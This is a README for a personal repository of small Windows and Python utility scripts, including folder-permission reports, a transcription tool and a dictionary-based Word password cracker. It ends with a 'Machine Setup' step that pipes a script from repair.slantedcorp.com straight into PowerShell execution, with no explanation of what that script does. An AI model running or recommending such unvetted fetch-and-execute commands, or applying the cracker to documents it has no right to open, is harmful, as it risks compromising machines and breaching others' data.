
# WorkRepo

This repository contains various scripts and tools for different tasks, such as folder management, password cracking, audio transcription, and more. Below is an overview of each script included in this repository.

## Folder Creator Application

### Description:
A Python and Tkinter-based application to create and manage folder structures with specific states.

### Features:
- Save and load folder states.
- Check and uncheck folders.
- Create folders based on the defined structure.

### Prerequisites:
- Python 3.x
- Tkinter (usually comes with Python, but ensure it's installed)

### Installation:
```bash
pip install tk
```

### Usage:
1. Run the script.
2. Use the GUI to manage folder structures.
3. Save and load folder states as needed.

### Example:
```bash
python folder_creator.py
```

## Folder Inheritance Check (PowerShell)

### Description:
A script to check folder inheritance and generate a report.

### Features:
- Prompts user for directory and depth of search.
- Outputs HTML report of folder inheritance status.

### Prerequisites:
- PowerShell

### Usage:
1. Run the script.
2. Follow prompts to provide directory and depth.
3. View the generated HTML report.

### Example:
```bash
powershell -File folder_inheritance_check.ps1
```

## Word Password Cracker (Python)

### Description:
A script to attempt to unlock a password-protected Word document using a list of passwords.

### Features:
- Loads passwords from a text file.
- Tries each password until the correct one is found.

### Prerequisites:
- Python 3.x
- Tkinter
- msoffcrypto

### Installation:
```bash
pip install tk msoffcrypto-tool
```

### Usage:
1. Run the script.
2. Select the Word document and password list.
3. Monitor progress and results via the GUI.

### Example:
```bash
python word_password_crack.py
```

## Audio/Video Transcription (Python)

### Description:
A tool for transcribing audio or video files using OpenAI's Whisper model.

### Features:
- Extracts audio from video files.
- Uses OpenAI's API for transcription.
- Displays the transcription in a GUI.

### Prerequisites:
- Python 3.x
- Tkinter
- ffmpeg
- OpenAI API Key

### Installation:
1. Install ffmpeg from https://ffmpeg.org/download.html and add it to your PATH.
2. Install Python packages:
```bash
pip install tk openai
```

### Usage:
1. Set your OpenAI API key.
2. Run the script.
3. Select the audio/video file and start the transcription.

### Example:
```bash
python avi_mp3_to_whisper.py
```

## Folder Permissions Export (PowerShell)

### Description:
A script to export folder permissions into an HTML report.

### Features:
- Prompts user for directory and depth of search.
- Outputs detailed HTML report of folder permissions.

### Prerequisites:
- PowerShell

### Usage:
1. Run the script.
2. Follow prompts to provide directory and depth.
3. View the generated HTML report.

### Example:
```bash
powershell -File folder_permissions_export.ps1
```

## Latest YouTube Downloader (PowerShell)

### Description:
A script to download the latest video from a specified YouTube channel.

### Features:
- Downloads the latest video if it doesn't already exist in the output directory.

### Prerequisites:
- PowerShell
- youtube-dl

### Installation:
1. Install youtube-dl from https://youtube-dl.org/
2. Ensure youtube-dl is added to your PATH.

### Usage:
1. Set the path to the youtube-dl executable, channel URL, and output directory.
2. Run the script.

### Example:
```bash
powershell -File latest_youtube_downloader.ps1
```

## MiCollab Ringtone Replacer (Python)

### Description:
A script to replace ringtones in MiCollab.

### Features:
- Replaces default ringtones with custom ones.

### Prerequisites:
- Python 3.x
- Tkinter
- shutil (part of the Python standard library)

### Installation:
```bash
pip install tk
```

### Usage:
1. Run the script.
2. Select the audio file to use as a ringtone.
3. Apply the changes.

### Example:
```bash
python micollab_ringtone_replacer.py
```

---

## Machine Setup
  
## Download / How to use it?

### Method 1 - PowerShell (Recommended)

-   Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
-   Copy and paste the code below and press enter  
```
irm repair.slantedcorp.com | iex
```
For detailed instructions and examples, refer to the comments within each script. Ensure all dependencies are installed before running the scripts.
